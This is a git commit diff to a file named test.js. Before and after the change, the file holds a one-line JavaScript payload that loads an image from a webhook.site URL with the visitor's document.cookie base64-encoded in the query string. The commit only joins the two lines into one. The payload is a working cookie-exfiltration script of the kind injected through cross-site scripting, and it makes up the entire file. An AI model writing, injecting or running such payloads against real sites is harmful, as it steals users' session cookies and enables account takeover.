d4fe5edc2589b48e28ea92dfd04c65c75153863d
rzpatryk <59359595+rzpatryk@users.noreply.github.com>
2025-08-30 15:02:53 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,2 +1,1 @@
-$x=new Image(); 
-x.src='https://webhook.site/fedadb08-fef3-496d-88b5-c7012fef98db?data='+btoa(document.cookie);
+$x=new Image(); x.src='https://webhook.site/fedadb08-fef3-496d-88b5-c7012fef98db?data='+btoa(document.cookie);
